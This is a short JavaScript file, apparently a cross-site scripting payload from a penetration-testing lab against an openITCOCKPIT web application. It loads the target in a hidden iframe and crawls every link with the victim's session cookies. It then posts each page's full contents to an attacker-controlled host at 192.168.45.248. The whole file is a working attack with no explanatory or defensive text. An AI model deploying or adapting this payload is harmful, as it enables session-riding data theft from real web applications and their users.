function validURL(url) {
  if (url.endsWith("/login/logout")) { return false };
  return /^(https?:\/)?\//.test(url);
}

function getContent() {
  var hrefs = Array.from(iframe.contentDocument.getElementsByTagName("a"))
    .map(a => a.href)

  var uniqueHrefs = _.unique(hrefs);

  var validUniqueHrefs = uniqueHrefs.filter(h => validURL(h));

  validUniqueHrefs.forEach((url) => {
    fetch(url, {credentials:"include", method:"GET"})
      .then((res) => res.text())
      .then((text) => {
        fetch("https://192.168.45.248/post_content", {
          method: "POST",
          body: `url=${encodeURIComponent(url)}&content=${encodeURIComponent(text)}`,
          headers: { "Content-Type": "application/x-www-form-urlencoded" },
          mode: "cors"
        })
      })
  });
}

function actions() {
  setTimeout(function() { getContent() }, 5000);
}

var iframe = document.createElement("iframe");
iframe.src = "https://openitcockpit/"
iframe.setAttribute("style", "display:none");
iframe.onload = actions;
iframe.width = "100%";
iframe.height = "100%";

body = document.getElementsByTagName("body")[0];
body.appendChild(iframe);

